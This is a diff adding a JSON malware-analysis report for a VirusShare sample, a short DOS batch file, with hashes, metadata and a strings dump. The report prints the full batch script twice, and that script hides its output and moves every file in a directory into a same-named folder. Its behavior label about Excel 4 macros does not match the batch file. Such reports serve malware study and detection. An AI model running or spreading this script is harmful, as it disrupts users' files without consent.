@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\nctty nul\nif %1==\" goto EnBucla\nattrib -r %1\nren %1 EnBucla.swp\nmd %1\nmove EnBucla.swp %1\\\nren %1\\EnBucla.swp %1\\%1\ngoto FinBucle\n:EnBucla\nfor %%n in(*.*) do Call %0 %%n\n:FinBucle"
+    },
+    "filename": "VirusShare_0868063e234258248d007e3bbb2e8b37",
+    "filesize": 201,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0868063e234258248d007e3bbb2e8b37",
+        "sha1": "0f57f5fb61d55dbc6e47684aee216d886c8e24a0",
+        "sha256": "f94cd8e9ab40f3fe1851bc1ee0c00eac0862b81b107de8c615948b325344f64f"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "ctty nul",
+            "if %1==\" goto EnBucla",
+            "attrib -r %1",
+            "ren %1 EnBucla.swp",
+            "md %1",
+            "move EnBucla.swp %1\\",
+            "ren %1\\EnBucla.swp %1\\%1",
+            "goto FinBucle",
+            ":EnBucla",
+            "for %%n in(*.*) do Call %0 %%n",
+            ":FinBucle"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.260437",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
